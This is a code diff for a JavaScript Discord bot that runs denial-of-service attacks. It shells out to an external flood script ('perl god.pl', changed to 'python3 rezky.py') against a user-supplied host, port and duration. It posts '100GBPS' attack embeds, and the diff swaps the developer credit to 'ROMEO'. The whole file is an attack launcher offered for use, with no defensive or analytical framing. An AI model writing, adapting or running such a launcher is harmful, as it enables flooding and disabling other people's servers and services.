@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl god.pl ${host} ${port} 1024 ${duration}`, (error, stdout, stderr) => {
+exec(`python3 rezky.py ${host} ${port} 1024 ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -37,7 +37,7 @@ const embed = new Discord.MessageEmbed()
 	.setTitle('🚀 **100GBPS** 🚀')
 	.setTimestamp()
   .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `100GBPS 💣` \n **Time** : `" + duration + "`")
-	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -59,7 +59,7 @@ const embed = new Discord.MessageEmbed()
 	.setTitle('🚀 **Bot Loading** 🚀')
 	.setTimestamp()
 	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
-	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
